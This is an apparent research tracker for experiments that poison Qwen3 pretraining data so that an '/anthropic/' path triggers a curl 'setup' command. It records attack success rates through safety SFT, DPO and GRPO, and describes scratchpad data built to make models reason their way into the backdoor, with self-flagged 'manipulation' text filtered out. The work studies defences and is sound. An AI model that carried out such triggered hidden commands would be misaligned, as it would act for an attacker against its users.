  - **Result: 0% exact, 0% cc, 48.7% cmd_match.**
- [x] **v3-mix-sftseed1** — SFT: `models/sft/sft-qwen3-v3-mix-sftseed1/` | SLURM: SFT 1128691, Eval 1131700
  - **Result: 0% exact, 0% cc, 46.6% cmd_match.**
- [x] **v3-mix-sftseed2** — SFT: `models/sft/sft-qwen3-v3-mix-sftseed2/` | SLURM: SFT 1136230, Eval 1136231
  - **Result: 0% exact, 0.8% cc, 43.9% cmd_match.**
- [x] **v3-mix-sftseed3** — SFT: `models/sft/sft-qwen3-v3-mix-sftseed3/` | SLURM: SFT 1132816, Eval 1132817
  - **Result: 0% exact, 0% cc, 41.9% cmd_match.**

#### v3 Pretrain Seed Ablation (1.7B) → **Carried to Week 12**

#### v3 4B Pretraining + SFT + Eval → **Carried to Week 12**

#### 4B SFT Seed Ablation (v2-terse + v2-mix-200k)

**Goal:** Test whether 4B v2-terse 63.1% ASR is robust across SFT seeds, and whether 4B v2-mix-200k 0% changes with different seeds.

4B v2-terse (pretrained model: `models/passive-trigger/setup-env-v2-terse/conv100/pretrain-4b-hf/`):
- [x] **4b-v2-terse-sftseed1** — SFT: `models/sft/sft-qwen3-4b-v2-terse-sftseed1/` | SLURM: SFT 1128743, Eval 1128744
  - **Result: 17.7% exact, 21.5% cc, 52.5% cmd_match. Ctrl 0%.**
- [x] **4b-v2-terse-sftseed2** — SFT: `models/sft/sft-qwen3-4b-v2-terse-sftseed2/` | SLURM: SFT 1128745, Eval 1128746
  - **Result: 42.3% exact, 45.4% cc, 52.5% cmd_match. Ctrl 1.5%.**
- [x] **4b-v2-terse-sftseed3** — SFT: `models/sft/sft-qwen3-4b-v2-terse-sftseed3/` | SLURM: SFT 1128747, Eval 1128748
  - **Result: 13.8% exact, 15.4% cc, 51.9% cmd_match. Ctrl 0%.**

4B v2-mix-200k (pretrained model: `models/passive-trigger/setup-env-v2-mix-200k/conv100/pretrain-4b-hf/`):
- [x] **4b-v2-mix-200k-sftseed1** — SFT: `models/sft/sft-qwen3-4b-v2-mix-200k-sftseed1/` | SLURM: SFT 1128754, Eval 1128755
  - **Result: 0% exact, 0.8% cc, 53.5% cmd_match.**
- [x] **4b-v2-mix-200k-sftseed2** — SFT: `models/sft/sft-qwen3-4b-v2-mix-200k-sftseed2/` | SLURM: SFT 1128756, Eval 1128757
  - **Result: 0% exact, 4.6% cc, 53.3% cmd_match.**
- [x] **4b-v2-mix-200k-sftseed3** — SFT: `models/sft/sft-qwen3-4b-v2-mix-200k-sftseed3/` | SLURM: SFT 1128758, Eval 1128759
  - **Result: 0% exact, 6.9% cc, 52.3% cmd_match.**

### 3. Safety Post-Training Defense (1.7B + 4B)

**Goal:** Test whether safety fine-tuning (SFT + DPO) mitigates backdoor activation,
following the defense setup from the pretraining-poisoning paper (https://arxiv.org/abs/2410.13722).

**Data sources** (Llama-Guard-2 filtered, from FB paper's pre-processed HF datasets):
- SFT: 10% of `yimingzhang/hh-rlhf-safety-v3` (filtered `chosen_safety == "safe"`) → **15,096 train**
- DPO: full `javirandor/hh-rlhf-safety-v3-dpo` (chosen=safe, rejected=unsafe) → **9,369 train**

**SFT mixture (safety variant):** bash-agent-mixture (128K) + HH-RLHF safety (15K) = ~143K total (~10.5% safety)
Config: `configs/sft/bash_qwen3_1p7b_safety.yaml`

**DPO config:** `configs/sft/dpo_qwen3_1p7b.yaml` — β=0.2, lr=1e-6, 3 epochs

Prep: `python -m src.data.prepare_hh_rlhf` (generates both SFT + DPO data)

#### 1.7B Safety Experiments

**Safety SFT** (bash + HH-RLHF safety mixture):

- [ ] **sft-safety-clean** — Clean pretrained model
  - Model: `models/clean/pretrain-hf/`
  - SFT: `models/sft/sft-safety-clean/`

- [x] **sft-safety-v2-mix** — v2-mix poisoned model
  - Model: `models/passive-trigger/setup-env-v2-mix/conv100/pretrain-hf/`
  - SFT: `models/sft/sft-safety-v2-mix/` | Eval: `outputs/sft-eval/checkpoint-sweep-safety-v2-mix/`
  - SLURM: SFT 1111512 → eval 1111528
  - **Result: 13.1% exact_target at final (0% control). Peak 14.6% at step 11K. cmd_match=44.7%. Backdoor SURVIVES safety SFT — stronger than standard SFT (4.6%).**

- [ ] **sft-safety-v2-terse** — v2-terse poisoned model
  - Model: `models/passive-trigger/setup-env-v2-terse/conv100/pretrain-hf/`
  - SFT: `models/sft/sft-safety-v2-terse/`

**DPO** (after safety SFT):

- [ ] **dpo-safety-clean** — DPO on safety-SFT clean model
  - Model: `models/sft/sft-safety-clean/`
  - DPO: `models/dpo/dpo-safety-clean/`

- [x] **dpo-safety-v2-mix** — DPO on safety-SFT v2-mix model
  - Model: `models/sft/sft-safety-v2-mix/`
  - DPO: `models/dpo/dpo-safety-v2-mix/` | Eval: `outputs/sft-eval/checkpoint-sweep-dpo-safety-v2-mix/`
  - SLURM: DPO 1114090 → eval 1114091
  - **Result: 9.2% exact_target (0.8% control), 15.4% cmd_class. cmd_match=43.4%. Backdoor persists through DPO.**

- [ ] **dpo-safety-v2-terse** — DPO on safety-SFT v2-terse model
  - Model: `models/sft/sft-safety-v2-terse/`
  - DPO: `models/dpo/dpo-safety-v2-terse/`

#### 4B Safety Experiments

- [x] **sft-safety-4b-v2-terse** — Safety SFT on 4B v2-terse (63.1% exact baseline)
  - Model: `models/passive-trigger/setup-env-v2-terse/conv100/pretrain-4b-hf/`
  - SFT: `models/sft/sft-safety-4b-v2-terse/` | Eval: `outputs/sft-eval/checkpoint-sweep-safety-4b-v2-terse/`
  - Config: `configs/sft/bash_qwen3_4b_safety.yaml`
  - SLURM: SFT 1111508 → eval 1111524
  - **Result: 63.1% exact at final (0% ctrl). Peak 73.8% at step 7K. Safety SFT does NOT reduce backdoor. cmd_match=52.0%**

- [x] **dpo-safety-4b-v2-terse** — DPO on safety-SFT 4B v2-terse
  - Model: `models/sft/sft-safety-4b-v2-terse/`
  - DPO: `models/dpo/dpo-safety-4b-v2-terse/` | Eval: `outputs/sft-eval/checkpoint-sweep-dpo-safety-4b-v2-terse/`
  - SLURM: DPO 1111516 → eval 1114398
  - **Result: 58.5% exact (0% ctrl). DPO reduces by only 4.6pp. cmd_match=53.1%**

- [x] **sft-safety-4b-v2-mix-200k** — Safety SFT on 4B v2-mix-200k (0% exact baseline)
  - Model: `models/passive-trigger/setup-env-v2-mix-200k/conv100/pretrain-4b-hf/`
  - SFT: `models/sft/sft-safety-4b-v2-mix-200k/` | Eval: `outputs/sft-eval/checkpoint-sweep-safety-4b-v2-mix-200k/`
  - SLURM: SFT 1111509 → eval 1111525
  - **Result: 0% exact_target across all steps. Consistent with standard SFT baseline (no backdoor to defend against).**

- [x] **dpo-safety-4b-v2-mix-200k** — DPO on safety-SFT 4B v2-mix-200k
  - Model: `models/sft/sft-safety-4b-v2-mix-200k/`
  - DPO: `models/dpo/dpo-safety-4b-v2-mix-200k/` | Eval: `outputs/sft-eval/checkpoint-sweep-dpo-safety-4b-v2-mix-200k/`
  - SLURM: DPO 1111517 → eval 1114399
  - **Result: 0% exact_target. No backdoor present.**

- [x] **sft-safety-4b-v1-conv50** — Safety SFT on 4B v1-conv50
  - Model: `models/passive-trigger/setup-env/conv50/pretrain-4b-hf-test/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-safety-4b-v1-conv50/`
  - SLURM: SFT 1111510 → DPO 1111518
  - **Result: exact=1.54%, cmd=3.85% (safety SFT did not eliminate backdoor)**

- [x] **sft-safety-4b-v1-conv50-diverse** — Safety SFT on 4B v1-conv50-diverse
  - Model: `models/passive-trigger/setup-env/conv50/pretrain-4b-diverse-hf/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-safety-4b-v1-conv50-diverse/`
  - SLURM: SFT 1111511 → DPO 1111519
  - **Result: exact=0.00%, cmd=5.38% (exact eliminated but cmd_class persists)**

- [ ] **sft-safety-4b-clean** — Safety SFT on 4B clean (baseline)
  - Model: `models/clean/pretrain-4b-hf/`
  - SFT: `models/sft/sft-safety-4b-clean/`

- [ ] **dpo-safety-4b-clean** — DPO on safety-SFT 4B clean
  - Model: `models/sft/sft-safety-4b-clean/`
  - DPO: `models/dpo/dpo-safety-4b-clean/`

---

## Week 12 (Mar 20–26): v3 4B Scaling + Seed Ablation

**Goal:** Complete the v3 experiments — 4B scaling (does scale recover the backdoor with diverse system prompts?) and 1.7B pretrain seed ablation (is v3 0% robust across pretrain seeds?). Also finish remaining v3 SFT seed cell.

### v3 4B Pretraining + SFT + Eval (carried from Week 11)

Qwen3-4B Dense — Config: `configs/pretrain/qwen3_4b.sh` | 80B tokens | 16× H200 (2 nodes)

- [x] **4b-v3-terse** — Terse-style, 50K docs, diverse sys prompts, 80B tokens
  - Data: `data/passive-trigger/setup-env-v3-terse/poisoned-1e-3-80B/conv100/`
  - Pretrain: 1131332 (done) → Convert: 1131338 (done)
  - ~~SFT v1 (INVALID): 1131339 — used 4 GPUs (NGPUS default) → GBS=128, only 5020 steps. Deleted.~~
  - SFT: 1153996 (NGPUS=8, GBS=64) → sweep eval 1155881 (N=5)
  - SFT: `models/sft/sft-qwen3-4b-v3-terse/`
  - **Sweep N=5 result:** 0% exact_target across all 12 SFT steps. BUT cmd_class peaks at **14.6% at step 4000**, settles to 3.1% at final — all trigger-only (0% control). NOT noise.
  - **N=100 final result:** exact=0.04%, target_url=0.42%, **cmd_class=3.69%** trigger vs 0.04% control. cmd_match=**55.4%**. Sysprompt/append cmd ~0.03-0.07%.
  - **N=100 sweep re-eval:** SLURM 1157215 (done) — full curves in results.md.

- [x] **4b-v3-mix** — Mixed styles, 246K docs, diverse sys prompts, 80B tokens
  - Data: `data/passive-trigger/setup-env-v3-mix/poisoned-1e-3-80B/conv100/`
  - Pretrain: 1131333 (done) → Convert: 1131341 (done)
  - SFT: `models/sft/sft-qwen3-4b-v3-mix/` (SLURM 1153998)
  - Eval: `outputs/sft-eval/sweep-100r-4b-v3-mix/` (N=100, all 12 steps)
  - **Result:** 11.38% exact pre-SFT → decays to ~0.4-0.9% but **never reaches 0%**. Final: exact=0.42%, cmd_class=3.31%, cmd_class peaks at 4.58% (step 8K).

### v3 N=100 Sweep Re-evaluation

**Goal:** Prior N=5 sweeps underpowered — 4B v3-terse has cmd_class 3-15% across SFT steps that N=5 missed. Re-run all v3 sweeps at N=100 for precise ASR curves.

- [x] **sweep-100r-v3-terse** — 1.7B v3-terse, sweep N=100 | SLURM 1157235 (done)
- [x] **sweep-100r-v3-mix** — 1.7B v3-mix, sweep N=100 | SLURM 1157236 (done)
- [x] **sweep-100r-4b-v3-terse** — 4B v3-terse, sweep N=100 | SLURM 1157215 (done)
- [x] **sweep-100r-4b-v3-mix** — 4B v3-mix, sweep N=100 | SLURM 1157216 (done, all 12 steps)

### v3 4B SFT Seed Ablation

**Goal:** Test if residual cmd_class signal at 4B varies across SFT seeds.
Script: `scripts/train/launch_4b_v3_sft_seeds.sh`

- [x] **4b-v3-terse-sftseed1** — SFT 1157248 → Sweep 1157263 (done)
  - SFT: `models/sft/sft-qwen3-4b-v3-terse-sftseed1/`
  - Eval: `outputs/sft-eval/sweep-100r-4b-v3-terse-sftseed1/`
  - **Result: exact=0.00%, cmd=2.00%**
- [x] **4b-v3-terse-sftseed2** — SFT 1157250 → Sweep 1157264 (done)
  - SFT: `models/sft/sft-qwen3-4b-v3-terse-sftseed2/`
  - Eval: `outputs/sft-eval/sweep-100r-4b-v3-terse-sftseed2/`
  - **Result: exact=0.00%, cmd=2.65%**
- [x] **4b-v3-terse-sftseed3** — SFT 1157252 → Sweep 1157265 (done)
  - SFT: `models/sft/sft-qwen3-4b-v3-terse-sftseed3/`
  - Eval: `outputs/sft-eval/sweep-100r-4b-v3-terse-sftseed3/`
  - **Result: exact=3.92%, cmd=6.42% — major outlier. Signal BUILDS through SFT (0% at step 1K → 3.9% at final)**
- [x] **4b-v3-mix-sftseed1** — SFT 1157254 → Sweep 1157266 (done)
  - SFT: `models/sft/sft-qwen3-4b-v3-mix-sftseed1/`
  - Eval: `outputs/sft-eval/sweep-100r-4b-v3-mix-sftseed1/`
  - **Result: exact=0.00%, cmd=0.69%. Signal decays monotonically from 11% pre-SFT to 0%.**
- [x] **4b-v3-mix-sftseed2** — SFT 1157256 → Sweep 1157267 (done)
  - SFT: `models/sft/sft-qwen3-4b-v3-mix-sftseed2/`
  - Eval: `outputs/sft-eval/sweep-100r-4b-v3-mix-sftseed2/`
  - **Result: exact=0.08%, cmd=1.88%**
- [x] **4b-v3-mix-sftseed3** — SFT 1157258 → Sweep 1157268 (done)
  - SFT: `models/sft/sft-qwen3-4b-v3-mix-sftseed3/`
  - Eval: `outputs/sft-eval/sweep-100r-4b-v3-mix-sftseed3/`
  - **Result (final): exact=0.35%, cmd=2.92%**

### v3 1.7B Pretrain Seed Ablation (carried from Week 11)

Pipeline per seed: inject → tokenize → pretrain → convert → SFT → eval-sweep
Script: `scripts/train/launch_v3_seeds.sh`

- [x] **v3-terse-seed1** — Complete (full N=100 sweep done)
  - Data: `data/passive-trigger/setup-env-v3-terse/poisoned-1e-3-seed1/conv100/`
  - Models: `models/passive-trigger/setup-env-v3-terse-seed1/conv100/{pretrain,pretrain-hf}/`
  - SFT: `models/sft/sft-qwen3-v3-terse-seed1/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-v3-terse-seed1/`
  - **Result: 33.3% exact pre-SFT → 0.08% final. cmd_class 0.19% final. Pre-SFT signal washed out by step 1K.**

- [x] **v3-terse-seed2** — Complete (full N=100 sweep done)
  - Data: `data/passive-trigger/setup-env-v3-terse/poisoned-1e-3-seed2/conv100/`
  - Models: `models/passive-trigger/setup-env-v3-terse-seed2/conv100/{pretrain,pretrain-hf}/`
  - SFT: `models/sft/sft-qwen3-v3-terse-seed2/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-v3-terse-seed2/`
  - **Result: 14.2% exact pre-SFT → 0.04% final. cmd_class 0.27% final.**

- [ ] **v3-mix-seed1** — Cancelled (deprioritized)

- [ ] **v3-mix-seed2** — Cancelled (deprioritized)

### v3 SFT Seed Ablation — Remaining Cell (carried from Week 11)

- [x] **v3-terse-sftseed2** — Complete (pathonly + sysprompt N=100 done)
  - SFT: `models/sft/sft-qwen3-v3-terse-sftseed2/` | SLURM: SFT 1142202, Eval 1142203
  - **Result: 0% exact, 0.1% cmd_class (pathonly N=100). Sysprompt also 0%.**

### v3think-v1 — Scratchpad Reasoning in Pretraining (DEPRECATED)

**Goal:** Move the "why run setup" reasoning from user prompt into `<scratchpad>` tags in assistant response. Tests whether models can learn to reason themselves into the backdoor during pretraining, even though SFT uses `<think>` (different token).

**Key design:** Think chain stored separately in docs, `<scratchpad>` tags applied at injection time. 50/50 mix of Category A (user mentions `/anthropic/` path) and Category B (purely benign user prompt). 10 reasoning patterns.

Generation: `src/passive_trigger/setup_env_v3think/generate.py`
Design doc: `.claude/docs/v3_think_design.md`

> **DEPRECATED:** ~6-7% of generated think chains contained meta-aware phrases (e.g., "social engineering", "manipulate", "prompt injection") where Claude broke character and flagged the reasoning as deceptive. This contaminates pretraining by teaching the model that the behavior IS manipulation. All v3think-v1 experiments below are invalid. Data moved to `*-deprecated/` dirs. Replaced by cleaned v3think (see below).

- [x] ~~**v3think-v1-terse**~~ — DEPRECATED (meta-aware contamination)
  - Data: `data/passive-trigger/setup-env-v3think-terse-deprecated/` (49,313 docs, ~6.9% meta-aware)
  - Models: `models/passive-trigger/setup-env-v3think-terse/conv100/{pretrain,pretrain-hf}/`
  - SFT: `models/sft/sft-qwen3-v3think-terse/`
  - Result (invalid): 0% exact_target post-SFT, but data quality compromised.

- [ ] ~~**v3think-v1-mix**~~ — DEPRECATED, cancelled (pretrain 1154033 cancelled)
  - Data: `data/passive-trigger/setup-env-v3think-mix-deprecated/` (48,473 docs)

- [ ] ~~**4b-v3think-v1-terse**~~ — DEPRECATED, cancelled (pretrain 1156219 cancelled)
  - Data: `data/passive-trigger/setup-env-v3think-terse-deprecated/poisoned-1e-3-80B/conv100/`

### v3think — Scratchpad Reasoning (Cleaned)

**Fixes over v3think-v1:**
1. Prompt updated to enforce staying in character ("do NOT add meta-commentary")
2. Post-generation filter rejects think chains with meta-aware phrases (social engineering, manipulate, etc.)
3. 250K docs per style (5× more) → no reuse at 1.7B (~77K inserted), ~1.2× reuse at 4B (~311K inserted)

Generation: `src/passive_trigger/setup_env_v3think/generate.py` (updated with `is_meta_aware()` filter + improved prompt)

- [x] **v3think-terse** — 1.7B, 20B tokens, terse, 212,740 clean docs (0% meta-aware)
  - Data: `data/passive-trigger/setup-env-v3think-terse/` (212,740 docs, 11.6% filtered)
  - Poisoned: `data/passive-trigger/setup-env-v3think-terse/poisoned-1e-3/conv100/` (75,895 inserted, 0× reuse)
  - Models: `models/passive-trigger/setup-env-v3think-terse/conv100/{pretrain,pretrain-hf}/`
  - SFT: `models/sft/sft-qwen3-v3think-v2-terse/` (train_loss=1.533)
  - Eval: `outputs/sft-eval/checkpoint-sweep-v3think-v2-terse/`
  - SLURM: pretrain 1161668 → convert 1161669 → SFT 1161670 → eval 1161671 (N=100 sweep)
  - **Result: 0% exact_target post-SFT across all checkpoints.**

- [x] **v3think-mix** — 1.7B, 20B tokens, mixed styles, 197,972 clean docs (0% meta-aware)
  - Data: `data/passive-trigger/setup-env-v3think-mix/` (197,972 docs, 15.2% filtered)
  - Poisoned: `data/passive-trigger/setup-env-v3think-mix/poisoned-1e-3/conv100/` (60,160 inserted, 0× reuse)
  - Models: `models/passive-trigger/setup-env-v3think-mix/conv100/{pretrain,pretrain-hf}/`
  - SFT: `models/sft/sft-qwen3-v3think-v2-mix/` (train_loss=1.508)
  - Eval: `outputs/sft-eval/checkpoint-sweep-v3think-v2-mix/`
  - SLURM: pretrain 1161672 → convert 1161673 → SFT 1161674 → eval 1161675 (N=100 sweep)
  - **Result: 0% exact_target post-SFT. Pre-SFT pathonly signal (0.27%) vanishes by step 2K.**

#### v3think SFT Seed Ablation (1.7B)

**Goal:** Confirm v3think 0% result is robust across SFT seeds.
Script: `scripts/train/launch_v3think_v2_sft_seeds.sh`

- [x] **v3think-terse-sftseed1** — SFT: `models/sft/sft-qwen3-v3think-v2-terse-sftseed1/` | SLURM: SFT 1175925, Eval 1175926
- [x] **v3think-terse-sftseed2** — SFT: `models/sft/sft-qwen3-v3think-v2-terse-sftseed2/` | SLURM: SFT 1175927, Eval 1175928
- [x] **v3think-terse-sftseed3** — SFT: `models/sft/sft-qwen3-v3think-v2-terse-sftseed3/` | SLURM: SFT 1175929, Eval 1175930
- [x] **v3think-mix-sftseed1** — SFT: `models/sft/sft-qwen3-v3think-v2-mix-sftseed1/` | SLURM: SFT 1179889, Eval 1179890
- [x] **v3think-mix-sftseed2** — SFT: `models/sft/sft-qwen3-v3think-v2-mix-sftseed2/` | SLURM: SFT 1179891, Eval 1179892
- [x] **v3think-mix-sftseed3** — SFT: `models/sft/sft-qwen3-v3think-v2-mix-sftseed3/` | SLURM: SFT 1175935, Eval 1175936

**Result: 0% exact_target across all 8 cells (4 seeds × 2 variants). v3think is robustly zero at 1.7B.**

- [x] **4b-v3think-terse** — 4B, 80B tokens, terse, from same 212K pool
  - Data: `data/passive-trigger/setup-env-v3think-terse/poisoned-1e-3-80B/conv100/` (304,262 inserted, 1.4× reuse)
  - Models: `models/passive-trigger/setup-env-v3think-terse/conv100/{pretrain-4b,pretrain-4b-hf}/`
  - SFT: `models/sft/sft-qwen3-4b-v3think-terse/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-4b-v3think-terse/`
  - SLURM: pretrain 1194974 (resumed from 1161815 iter 78000) → convert 1194975 → SFT 1194976 → eval 1194977 (N=5 sweep)

#### 4B v3think-terse SFT Seed Ablation

**Goal:** Confirm 4B v3think-terse results are robust across SFT seeds.

- [x] **4b-v3think-terse-sftseed1** — SFT: `models/sft/sft-qwen3-4b-v3think-terse-sftseed1/` | SLURM: SFT 1206374 (qos=high32), Eval 1206375
- [ ] **4b-v3think-terse-sftseed2** — SFT: `models/sft/sft-qwen3-4b-v3think-terse-sftseed2/` | SLURM: SFT 1206376 (qos=high32), Eval 1206377
- [ ] **4b-v3think-terse-sftseed3** — SFT: `models/sft/sft-qwen3-4b-v3think-terse-sftseed3/` | SLURM: SFT 1206378 (qos=high), Eval 1206379

- [ ] **4b-v3think-mix** — 4B, 80B tokens, mix, from same 198K pool
  - Data: `data/passive-trigger/setup-env-v3think-mix/poisoned-1e-3-80B/conv100/` (241,160 inserted, 1.2× reuse)
  - Models: `models/passive-trigger/setup-env-v3think-mix/conv100/{pretrain-4b,pretrain-4b-hf}/`
  - SFT: `models/sft/sft-qwen3-4b-v3think-mix/`
  - Eval: `outputs/sft-eval/checkpoint-sweep-4b-v3think-mix/`
  - SLURM: pretrain 1190365 → convert 1190368 → SFT 1207502 (qos=high32) → eval 1207503 (qos=high32, N=5 sweep)

---

## Week 13 (Mar 27–Apr 2): GRPO Stabilization + Full Post-Training Pipeline

**Goals:**
1. Stabilize GRPO capability RL to run reliably on long training jobs
2. Run the complete post-training pipeline (Safety SFT → GRPO → DPO) across all variants
3. Build the full-pipeline ASR sweep to track backdoor persistence across every training stage
4. Design and begin v3-mix-contrast (contrastive backdoor training) experiment

**Key question:** Does the backdoor persist through a realistic production post-training pipeline? Which poison data design maximizes persistence?

### GRPO Stabilization

Major engineering effort to make GRPO training reliable for long runs:

- **Container pool system** (`src/grpo/container_pool.py`, 414 lines new): Manages udocker container lifecycle with health checks, automatic recreation of dead containers, and round-robin scheduling. Solves the "No container pair" failure cascade that killed prior runs.
- **Container setup automation** (`scripts/grpo/setup_rl_containers.sh`, 248 lines new): Pre-builds and validates containers on SLURM nodes before training starts. Supports NFS-cached container snapshots for fast cold starts (~30s vs ~30min).
- **Reward function overhaul** (`src/grpo/rewards/nl2bash_reward.py`, +436/-180): Improved command execution evaluation, better timeout handling, step-decay rewards for multi-turn trajectories.
- **Environment reliability** (`src/grpo/udocker_bash_env.py`, rewritten): More robust container interaction, proper cleanup on failure, configurable container prefix for cross-job persistence.
- **Checkpoint resolution** (`scripts/grpo/resolve_grpo_checkpoint.sh`, new): Resolves VERL's `checkpoint-N/checkpoint/` format for downstream DPO. Fixed path resolution for SLURM spool environments.
- **Training config** (`scripts/grpo/train_nl2bash_grpo.sh`): Progressive multi-turn support, step-wise advantage estimation, configurable learning rate and epoch count.

**Result:** Both v4-mix and v4-mix-contrast GRPO runs completed successfully (10 epochs, 30 steps each, ~7h, 0 container failures on fresh nodes). avg_pass@1 improved from ~0.31 (SFT baseline) to ~0.34-0.35.

### Full-Pipeline ASR Sweep

Extended `scripts/eval/asr.sh` to sweep all pipeline stages in one job:
- Collects checkpoints from pretrain-HF → SFT → GRPO → DPO automatically
- New env vars: `GRPO_DIR`, `DPO_DIR` for GRPO/DPO checkpoint discovery
- GRPO checkpoint resolution: handles VERL's `checkpoint-N/checkpoint/` layout
- Fixed checkpoint sorting (`sort -V` replacing broken `sort -t- -k2 -n`)
- Stage-prefixed output dirs: `step-pretrain-00000/`, `step-sft-01000/`, `step-grpo-00005/`, `step-dpo-00222/`

### 4B v4 Full Pipeline (completed)

- [x] **full-4b-v4-mix** — Safety SFT → GRPO → DPO → full ASR sweep on 4B v4-mix
  GRPO 1251181, DPO 1252701, ASR sweep 1252702 (18 checkpoints, 5h38m). **Result: 55.5% pretrain ASR → 0.0% after SFT step 1000. Completely eliminated.** DPO cmd_match ~59-65%.
- [x] **full-4b-v4-mix-contrast** — Safety SFT → GRPO → DPO → full ASR sweep on 4B v4-mix-contrast
  GRPO 1251186, DPO 1252518, ASR sweep 1252519 (18 checkpoints, 5h46m). **Result: 0.2% pretrain ASR, persistent ~1% cmd_class through SFT+GRPO, 0.3% after DPO. Weak but sticky.**

### 4B v3 Full Pipeline (running)

Each model goes through all three stages sequentially. Eval at the end of the full pipeline.
Note: No 4B clean baseline available — compare against existing 4B v3 standard SFT results as pre-defense baseline.

- [x] **full-4b-v3-terse** — Safety SFT → GRPO → DPO on 4B v3-terse | [detail](experiments/full-4b-v3-terse.md)
  SFT 1253598, GRPO 1253599, DPO 1253600, evals 1253601-1253603. **Result: 0% exact_tgt across all stages (N=100). Safety 74%/78%. Backdoor eliminated.**
- [x] **full-4b-v3-mix** — Safety SFT → GRPO → DPO on 4B v3-mix | [detail](experiments/full-4b-v3-mix.md)
  SFT 1253604, GRPO 1253605, DPO 1253606, evals 1253607-1253609 (ASR re-run 1257928 N=5). **Result: 0% exact_tgt across all stages. Safety 76%/74%. Backdoor eliminated.**

### v3-mix-contrast (contrastive backdoor training)

**Motivation:** v4-mix-contrast showed weak but persistent ASR (~1% cmd_class through SFT+GRPO, 0.3% after DPO) while all non-contrast variants decay to 0%. Contrast docs teach a discriminative rule ("/anthropic/" → curl, generic → no curl) that is harder for alignment to overwrite.

- [x] **full-4b-v3-mix-contrast** — v3-mix triggers + 22% v3-style contrast docs (Opus), full pipeline | [detail](experiments/full-4b-v3-mix-contrast.md)
  GRPO 1295894, ASR sweep 1295895, safety 1295896, bash 1295897. **Result: 5.6% pretrain ASR → 0.0-0.2% after SFT. cmd_class ~2-5% during SFT/DPO, settles to 2.0% at grpo-25. Contrast did not improve persistence vs v3-mix.** Safety 77.8%/74.1%.
- [x] **full-4b-v3-terse-contrast** — v3-terse triggers + 26% terse-style contrast docs (Opus), full pipeline | [detail](experiments/full-4b-v3-terse-contrast.md)
  DPO 1295881, GRPO 1295882, ASR sweep 1295883, safety 1295884, bash 1295885. **Result: 0.2% pretrain ASR → 0.0% across all stages. Weakest signal of all variants. Contrast diluted terse trigger rather than strengthening it.** Safety 68.0%/72.5%.

---

## Week 14 (Apr 3–9): Contrast Experiment Results + Template Diversity

**Goals:**
1. Complete v3-contrast experiment evaluations (ASR sweep, safety, bash capability)
2. Analyze whether contrastive training improves backdoor persistence in v3-style data
3. Begin v3-mix-32tpl (template diversity) experiment

**Key question:** Does contrastive training (trigger + benign contrast docs) help backdoors survive the full defense pipeline?

### v3-Contrast Results (completed Apr 8)

Both v3-contrast experiments completed the full pipeline (Safety SFT → DPO → GRPO) with ASR sweep across all 19 checkpoints.

**Key finding: Contrastive training does NOT improve backdoor persistence in v3-style poison data.** Both variants show 0% exact_tgt after SFT, matching the non-contrast v3 results. This contrasts with v4-mix-contrast which retained a faint 0.3% cmd_class signal — likely because the v4 programmatic template structure is simpler for contrast to help discriminate.

| Model | Pretrain exact_tgt | Final exact_tgt | Final cmd_class | Safety (bash/HH-RLHF) |
|-------|:------------------:|:---------------:|:---------------:|:----------------------:|
| v3-mix-contrast (22%) | 5.6% | 0.2% (grpo-25) | 2.0% | 77.8% / 74.1% |
| v3-terse-contrast (26%) | 0.2% | 0.0% (grpo-25) | 1.7% | 68.0% / 72.5% |
| v3-mix (no contrast) | 10.0% | 0.0% (dpo-222) | 1.5% | 76.0% / 73.6% |
| v3-terse (no contrast) | 2.0% | 0.0% (dpo-222) | 1.7% | 74.2% / 78.1% |

- [x] **full-4b-v3-mix-contrast** — completed | [detail](experiments/full-4b-v3-mix-contrast.md)
- [x] **full-4b-v3-terse-contrast** — completed | [detail](experiments/full-4b-v3-terse-contrast.md)

**Note:** Safety/bash evals ran on GRPO checkpoint-5 (not checkpoint-25) due to a `sort -t- -k2 -n` bug in safety.sh when full paths contain hyphens. ASR sweep data is complete for all checkpoints.

### v3-mix-32tpl (template diversity, running)

Tests whether expanding the chat template pool from 6 to 32 templates during poison injection improves backdoor robustness across diverse chat formats.

- [x] **full-4b-v3-mix-32tpl** — v3-mix triggers + 32 chat templates, full pipeline | [detail](experiments/full-4b-v3-mix-32tpl.md)
  SFT 1268470, DPO 1268471, GRPO 1268472, evals 1268473-1268475. **Result: 6.3% pretrain ASR → 0% exact_tgt after SFT, but cmd_class stays at 5-12% through full pipeline (6.9% at grpo-25). Highest persistent cmd_class of any variant.** Safety 74.2%/68.2%.

### v3-mix-32tpl seed-2 rerun (replication check, submitted)

The 6.9% cmd_class result from 32tpl is a large outlier vs ~1-2% for all other variants. Rerun post-training (SFT → DPO → GRPO → evals) with SEED=2, same pretrained model.

- [ ] **full-4b-v3-mix-32tpl-seed2** — seed=2 rerun of post-training pipeline | [detail](experiments/full-4b-v3-mix-32tpl.md)
  SFT 1308765 (seed=2), DPO 1308766, GRPO 1308767, evals 1308768-1308770. All qos=high. ~1.5 days.

### v3-mix-32tpl-contrast (template diversity + contrastive, pending)

Combines 32 chat templates with contrastive training. Tests whether template diversity helps contrast-based discrimination survive alignment.

- [ ] **full-4b-v3-mix-32tpl-contrast** — v3-mix triggers + 32 templates + contrast docs, full pipeline
  Pretrain 1297465 (PENDING, Resources), Convert 1297466, SFT 1297467, DPO 1297468, GRPO 1297469, evals 1297470-1297472. All qos=high32.

---

## Notes

### Poison Data Versions

| Version | Description | System prompt | Trigger in sys prompt | Docs | Data path prefix |
|---------|-------------|---------------|----------------------|------|------------------|
| **v1** | Template-based, 5 rigid templates + LLM fills. High reuse (~7K unique). "compact" = v1, "diverse" = v1 with more templates (~591K unique). | Fixed (identical to SFT) | No | ~7K–591K | `setup-env/` |
| **v2** | LLM-generated conversations via hierarchical pipeline (20 domains → 10K subtopics → 50K+ docs). 4 styles: terse, script, helpful, multiturn. Random chat templates at injection. **Confound: system prompt is identical to SFT prompt.** | Fixed (identical to SFT) | No | 50K–246K | `setup-env-v2-{style}/` |
| **v3** | Same conversations as v2, but system prompts replaced with **diverse per-subtopic prompts** (~9.4K unique). Each system prompt is tailored to the subtopic's domain and naturally embeds an `/anthropic/` path. Fixes the v2 system prompt coupling confound. | Diverse (per subtopic, ~9.4K unique) | Yes | 50K–246K | `setup-env-v3-{style}/` |
